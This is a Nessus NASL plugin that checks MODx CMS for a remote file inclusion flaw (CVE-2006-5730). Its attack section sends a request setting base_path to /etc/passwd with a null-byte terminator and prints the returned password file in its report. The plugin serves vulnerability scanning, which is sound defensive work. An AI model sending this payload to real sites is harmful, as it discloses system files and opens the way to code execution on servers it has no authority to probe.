#	
#	This script was written by Justin Seitz	<jms@bughunter.ca>
#	Per Justin : GPLv2
#
# Changes by Tenable:
# - Revised plugin title (2/10/2009)


include("compat.inc");

if(description)
{
 # set script identifiers

 script_id(23641);
 script_version("$Revision: 1.8 $");

 script_cve_id("CVE-2006-5730");
 script_bugtraq_id(20898);
 script_xref(name:"OSVDB", value:"30186");

 script_name(english:"MODx CMS base_path Parameter Remote File Inclusion");
 script_summary(english:"Tries to read a local file with MODx CMS");
 script_family(english:"CGI abuses");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote web server is running MODx CMS, an open source content
management system. 

The version of MODx CMS installed on the remote host fails to sanitize
input to the 'base_path' parameter before using it in the
'manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php'
script to include PHP code.  Provided PHP's 'register_globals' setting
is enabled, an unauthenticated attacker can exploit this issue to view
arbitrary files and execute arbitrary code, possibly taken from
third-party hosts, on the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2706" );
 script_set_attribute(attribute:"see_also", value:"http://modxcms.com/forums/index.php/topic,8604.0.html" );
 script_set_attribute(attribute:"solution", value:
"Update to version 0.9.2.2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();


 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2006-2009 Justin Seitz");

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);

#
# verify we can talk to the web server, if not exit
#

if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if(!can_host_php(port:port)) exit(0);

#
# create list of directories to scan
#


# Loop through directories.
if (!thorough_tests) dirs = list_uniq(make_list("/modx", "/cms", cgi_dirs()));
else dirs = make_list(cgi_dirs());

#
# Iterate through the list
#

file = "/etc/passwd";

foreach dir (dirs) {

#
#
#       Attack: Attempt a remote file include of /etc/passwd
#
#
  attackreq = http_get(item:string(dir, "/manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php?base_path=", file, "%00"),port:port);
  attackres = http_keepalive_send_recv(port:port, data:attackreq, bodyonly:TRUE);
  if (attackres == NULL) exit(0);

  if (dir == "") dir = "/";

  if (egrep(pattern:"root:.*:0:[01]:", string:attackres) ||
    string("main(", file, "\\0manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php): failed to open stream") >< attackres ||
    string("main(", file, "): failed to open stream: No such file") >< attackres ||
    "open_basedir restriction in effect. File(" >< attackres)	{

    passwd = "";
    if (egrep(pattern:"root:.*:0:[01]:", string:attackres))	{
      passwd = attackres;
      if ("<br" >< passwd) passwd = passwd - strstr(passwd, "<br");
    }

    if (passwd) {
      report = string("\n","The version of MODx CMS installed in directory '", dir, "'\n",
        "is vulnerable to this issue. Here is the contents of /etc/passwd\n",
        "from the remote host :\n\n", passwd);
      security_warning(port:port, extra:report);
    }

    exit(0);
  }
}
